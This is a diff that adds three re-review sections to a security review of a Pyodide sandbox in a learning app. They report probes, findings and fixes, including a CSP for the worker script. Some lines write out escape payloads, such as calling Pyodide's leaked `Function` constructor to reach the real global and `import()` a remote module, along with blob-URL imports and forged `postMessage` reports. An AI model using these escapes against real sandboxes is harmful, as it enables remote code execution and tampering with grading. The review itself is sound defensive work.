@@ -341,3 +341,111 @@ I re-ran every probe from the scratchpad, including a breadth-first crawl of abo
 - Lows: B5–B8, R7, R11, R12, C2.
 
 **Open Critical/High: none.**
+
+---
+
+## Re-review 4 (browser worker)
+
+Date: 2026-11-04. Scope: `git diff 1131632 c127118` (branch `sre/browser-hardening`). The commit adds `src/engines/python/lockdown.ts`, applied in `python.worker.ts` and in the verify child. It also gives every `gradePython`/`runPython` a fresh worker with a 6 s per-test kill, boots workers from a memory snapshot, and starts verify children with `--max-old-space-size=256 --wasm-max-mem-pages=16384`.
+
+Method: a scratch worktree at `c127118` with a Vite dev server on port 5199, driven from Chromium (Playwright). I imported `/src/engines/python/browserClient.ts` in the page and graded probe `tests.py` files through `gradePython`, so every probe ran in the real browser worker after `lockDownPython`. All probe files were deleted afterwards.
+
+Suites in the worktree: `pythonSandbox.test.ts`, `python.test.ts` and `ai-engineering.test.ts` ran twice, 632 tests each time. The first run had 1 failure: "stops a sync infinite loop…" took 9.3 s under parallel load. The second run passed all 632, and `pythonSandbox.test.ts` alone passed 52/52, so I treat it as a timing-sensitive test (R14 below).
+
+### What holds in the browser worker
+
+| Probe | Result |
+| --- | --- |
+| `import js` contents | Only the 30 allow-listed names (`Object` … `setTimeout`, `queueMicrotask`, `TextEncoder/Decoder`) |
+| `js.Object.constructor(...)` and the prototype `constructor` of `js.Promise.resolve`, `js.setTimeout`, `pyodide_js.runPython` | `EvalError: Code generation is disabled in the Python sandbox.` |
+| `js.setTimeout("…", 0)` | `TypeError: setTimeout only accepts a function` |
+| `pyodide.http.pyfetch` | fails (`AbortController` and `fetch` missing) |
+| `pyodide.http.open_url` (XHR) | `XMLHttpRequest is not defined` |
+| `pyodide.code.run_js` | `cannot import name 'eval' from 'js'` |
+| `pyodide_js.loadPackage("https://…")` | refused: "Installing packages is disabled" |
+| Python `socket.create_connection` | `Host is unreachable` |
+| Prototype of a `create_proxy` PyProxy, `.constructor(...)` | hangs inside the proxy; the 6 s per-test kill stops it and the next test runs (availability only) |
+| ai-engineering Python variants in the browser | I graded the solutions of `06-memory/04-long-term-memory` (8/8), `01-models/08-models-adr` (6/6) and `06-memory/06-memory-poisoning-and-privacy` (7/7) through the `dojo_ai` bridge. Both `demo.py` runs exited with code 0 and the expected output. No regression |
+
+### Findings
+
+**R13 — High — Code generation and network re-opened through `pyodide_js._api.tests.Function`.** [verified in Chromium] Pyodide exposes `_api.tests = { convertCppException, Function }`, which is a reference to the realm's original `Function` constructor. `lockDownPython` (`lockdown.ts:75-78`) only overrides `.constructor` on the four function prototypes; the `Function` object itself still works. From a Python test:
+- `pyodide_js._api.tests.Function("return globalThis")()` returned the real `WorkerGlobalScope`, with `postMessage` and `Blob` present (`fetch` was correctly gone).
+- `Function("return import('https://esm.sh/…/canvas-confetti.mjs')")()` **loaded and executed a remote module** (`remote module loaded: create,default`). That is network egress plus remote code execution in the worker.
+- `import(URL.createObjectURL(new Blob(["export default 42"])))` worked (`blob import 42`).
+- With the real global, `postMessage` lets learner code forge `test-report` messages (B5).
+
+I rate this High against the control the change claims, not against platform impact: the browser threat model is learner self-harm, there is no backend, and progress lives in `localStorage`, which a worker cannot reach. In the **verify child** the same `Function` is reachable, but it gains nothing: the frozen `process` allow-list (`typeof process.kill === "undefined"`), the `registerHooks` resolver (remote and `node:` imports are blocked: "Importing … is not allowed") and `--permission` all hold [verified].
+
+**Fix:**
+1. In `lockDownPython`, delete `pyodide._api.tests`. Better, also replace `globalThis.Function`, `eval` and the async and generator function constructors with throwing stand-ins, in addition to the prototypes.
+2. The durable fix is a CSP on the **worker script response** (CSP3: a dedicated worker uses the policy delivered with its own script; the page `<meta>` does not apply): `Content-Security-Policy: default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self'`. Without `'unsafe-eval'`, the engine itself refuses `Function`/`eval` whatever reference is held. `script-src 'self'` blocks `import()` of remote and `blob:` URLs, and `connect-src` blocks any other network API. Serve it from the dev middleware and the static host config, and check that Pyodide boots with only `'wasm-unsafe-eval'`. Add a browser probe for `_api.tests.Function` to the test plan.
+
+**R12 (browser counterpart) — Low — Local storage reachable.** The crawl found `pyodide_js._module.IDBFS.indexedDB`, and `pyodide_js.FS.filesystems` still lists `IDBFS`, `NODEFS`, `NATIVEFS_ASYNC` and `mountNativeFS`. IndexedDB of the app origin is reachable (unused by the app; it allows only persistence by the learner's own code). NODEFS is inert in the browser. **Fix:** remove `IDBFS`, `NODEFS` and `NATIVEFS_ASYNC` from `FS.filesystems` and delete `mountNativeFS` in `lockDownPython`.
+
+**B3 — Medium → partially fixed.** Direct network globals are gone. Indirect network is still possible through R13 until R13 is fixed.
+
+**B5 — Low, open.** Forged `postMessage` results are possible through R13. `browserClient.ts` checks `id` (`attempt`), but ids are sequential.
+
+**R14 — Low — Timing-sensitive test.** `pythonSandbox.test.ts` "stops a sync infinite loop" failed once (9,322 ms) when run together with `python.test.ts` and `ai-engineering.test.ts`. It passed on re-run and alone. Under parallel load, child startup plus the 6 s limit exceeds the asserted bound. **Fix:** raise `RESTART_ALLOWANCE_MS` or run the sandbox suite with `--no-file-parallelism` in CI.
+
+**Verify limits.** Process isolation and the memory flags did not regress. I did not probe `--max-old-space-size=256` and `--wasm-max-mem-pages=16384` (1 GiB of wasm) beyond the suites passing.
+
+**Open Critical/High: R13 (High) — `pyodide_js._api.tests.Function` restores code generation and remote `import()` in the browser worker. Fix before merging.**
+
+---
+
+## Re-review 5
+
+Date: 2026-11-04. Scope: `git diff c127118 17c5b05` (branch `sre/browser-hardening`). The changes:
+- `lockDownPython` (`src/engines/python/lockdown.ts:89-113`) deletes `_api.tests`, replaces `Function`/`eval` and the four function-prototype constructors with throwing stand-ins, and removes `indexedDB`, `IDBFS`, `NODEFS`, `NATIVEFS(_ASYNC)`, `mountNodeFS` and `mountNativeFS`;
+- `src/verify/pythonEscapeScan.py` walks reachable objects looking for original code generators;
+- `plugins/pythonWorkerCspPlugin.ts` sends `default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self'` on the worker script in dev and preview.
+
+Method: a scratch worktree at `17c5b05`. `npm run dev` (port 5201) and `vite build` + `vite preview` (port 5202) were driven from Chromium (Playwright). Python probes ran in the booted worker through `browserClient.gradePython` in dev. CSP probes ran in an un-booted worker (before the run-time stubs) through Playwright's worker handle, using code paths that CSP governs: string timers, `import()` and `fetch`, not the DevTools-evaluated code itself, which CDP exempts. The worktree, build output and servers were removed afterwards.
+
+Suites in the worktree: `pythonSandbox.test.ts`, `python.test.ts` and `ai-engineering.test.ts` passed 633/633 in one run.
+
+### Results
+
+| Probe | Result | Status |
+| --- | --- | --- |
+| R13 chain `pyodide_js._api.tests.Function` | `_api.tests` absent (`AttributeError: tests`) | **R13 fixed** |
+| `Function` via `js.Object.constructor`, `Function.prototype.constructor`, a bound constructor, the stand-in's own prototype chain | `EvalError: Code generation is disabled in the Python sandbox.` | fixed |
+| AsyncFunction via instances (`pyodide_js.runPythonAsync`, `useNodeSockFS`, the only async/generator functions on the API) → `.constructor` | `EvalError` | fixed |
+| `pythonEscapeScan.scan(max_nodes=15000)` in the browser worker (the 6 s per-test limit caps the budget) | `found=[]` | fixed (budget-limited; the full scan runs in verify) |
+| CSP header, dev: `/src/engines/python/python.worker.ts?worker_file&type=module` | sent | fixed |
+| CSP header, production build under `vite preview`: `/assets/python.worker-<hash>.js` | sent; the page itself has no CSP (the worker policy is enough) | fixed |
+| CSP enforced in the worker, **dev**: string `setTimeout` | did not run; `securitypolicyviolation: script-src eval` | enforced |
+| CSP enforced, **dev**: `import()` of `data:`, `blob:` and `https://esm.sh/…` URLs; `fetch("https://example.com")`; `WebSocket` | all blocked; `fetch('/pyodide/pyodide-lock.json')` from our origin still 200 | enforced |
+| CSP enforced, **production preview**: string timer, `import("data:…")`, remote `fetch` | all blocked; violations `script-src`, `script-src-elem`, `connect-src` | enforced |
+| Pyodide boots under the CSP (`'wasm-unsafe-eval'` only) | yes, in dev and in the production build | OK |
+| `WebAssembly.compile` of bytes in the worker | allowed (that is what `'wasm-unsafe-eval'` grants). From Python, `_module.wasmTable`/`convertJsFunctionToWasm` and other wasm helpers are reachable, but `WebAssembly.Module`/`instantiate` was not found within the scan budget. Even with attacker bytes, wasm has no ambient I/O: it can only call imports the caller passes from the allow-listed `js` globals, and `connect-src 'self'` still bounds every network API | Not exploitable for network (Info) |
+| `WorkerGlobalScope.prototype` restoration | The real global is no longer reachable from Python: `_api.tests` was its only path in Re-review 4, and the scan finds no generator. Even with the global, the network members were deleted from the prototype chain and redefined as non-configurable `undefined`, and CSP independently blocks `connect-src`/`script-src` | fixed |
+| `indexedDB`, `IDBFS`, `NATIVEFS*`, `mountNativeFS` | removed (Re-review 4's browser R12) | fixed |
+| ai-engineering Python variants, production build | `06-memory/04-long-term-memory` 8/8, `01-models/08-models-adr` 6/6 and `06-memory/06-memory-poisoning-and-privacy` 7/7, graded through the built worker and the `dojo_ai` bridge under the CSP | no regression |
+
+### Remaining items
+
+- **B5 — Low, accepted.** With the real global unreachable, forging `postMessage` results needs a new escape; frame-walking to the harness `notify` within Python remains (R8).
+- **R15 — Low — the CSP depends on the production host.** The policy is only sent by Vite dev/preview. A static host that serves `assets/python.worker-*.js` without the header falls back to the run-time stubs alone, which are sound today but are a deny-list. Add a deployment check (for example a smoke test that fetches the worker asset and asserts the header), and keep the CONTENT_GUIDE.md note.
+- **R14 — Low.** The timing-sensitive sandbox test did not fail in this run; keep the earlier recommendation.
+- Still open from earlier reviews (outside this change): C1 (Pydantic vendoring, Medium), A1 (identifier normalization, Medium), B6–B8, R7, R11, C2 (Low).
+
+**Open Critical/High: none.**
+
+---
+
+## Re-review 6
+
+Date: 2026-11-04. Scope: `git diff 17c5b05 06c9ffc`. The commit makes two changes. First, `pythonSandbox.child.ts:82` runs `os.urandom(1)` before `lockDown`, so Emscripten's lazy `getentropy` loads `node:crypto` while imports are still allowed. Second, the child bundle is written to `python-sandbox-child-<sha256 prefix>.mjs`, and `--allow-fs-read` names that exact file (`pythonSandbox.ts:84,385-401`). I probed from a scratch worktree at `06c9ffc` and removed it afterwards. `pythonSandbox.test.ts` passed 54/54, including the new entropy test (`os.urandom`, `secrets`, `uuid4`, `tempfile.mkdtemp`, unseeded `random.Random`).
+
+| Question | Finding | Status |
+| --- | --- | --- |
+| Does the preloaded `node:crypto` become reachable from Python? | No. Emscripten keeps it in a closure: `initRandomFill` does `var nodeCrypto = require("node:crypto"); return view => nodeCrypto.randomFillSync(view)`, and the internal `randomFill` used by `os.urandom` is a closure variable (`pyodide.asm.mjs`). The exported `Module.randomFill` and `Module.initRandomFill` are the lazy originals. Calling either from Python after lock-down re-runs `require("node:crypto")`, which the `registerHooks` resolver refuses (`Importing "node:crypto" is not allowed`). `Module.randomFill` has only `length`/`name`. No crypto module object (`createHash`, `KeyObject`, `setEngine`, `webcrypto`) is a property of anything reachable | No new capability |
+| Even if `node:crypto` leaked | `createPrivateKey` and similar take key material, not paths. `setEngine` would need a library path, and `--permission` (no `addon`, read limited to `node_modules/pyodide/` and the child file) plus the absence of any fs write keep that closed | Info |
+| Hashed child path in `--allow-fs-read` | Still exactly two read grants: `node_modules/pyodide/` (directory, unchanged since Re-review 2) and the one hashed child file. There is no directory-wide grant on `node_modules/.cache`, so a child cannot read other worktrees' bundles. The old `python-sandbox-child.mjs` stays in the cache, unread | No change to the boundary |
+| Bundle integrity | Content-addressed name, written via temp file plus `rename`, rewritten when content differs. This removes the cross-worktree mix-up the SRE found. A hostile local process could still swap the file between check and fork, which is outside the threat model (same user) | Low, accepted |
+| **R16 — Low — crawling `_module` kills the child.** | Walking `pyodide_js._module` from Python (descriptor values only) ended the child with exit code 1 when it reached the `_asciiTextDecoder` prototype region, while Emscripten printed its GL error source. The parent reports `Python exited unexpectedly`, and the next run gets a fresh interpreter. Availability only, contained; I did not chase the exact trigger | Low, open |
+
+**Open Critical/High: none.**
